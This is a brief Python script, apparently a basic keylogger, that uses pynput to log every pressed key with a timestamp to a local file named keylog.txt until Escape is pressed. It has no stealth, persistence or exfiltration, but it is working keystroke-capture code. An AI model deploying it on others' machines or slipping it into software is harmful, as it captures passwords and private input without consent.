from pynput import keyboard
import logging

# Set up logging configuration
logging.basicConfig(filename="keylog.txt", level=logging.DEBUG, format='%(asctime)s: %(message)s')

def on_press(key):
    try:
        # Log the key that was pressed
        logging.info(f'Key {key.char} pressed')
    except AttributeError:
        # Special keys (e.g., space, enter) are handled here
        logging.info(f'Special key {key} pressed')

def on_release(key):
    if key == keyboard.Key.esc:
        # Stop listener when the escape key is pressed
        return False

# Start listening to keyboard events
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()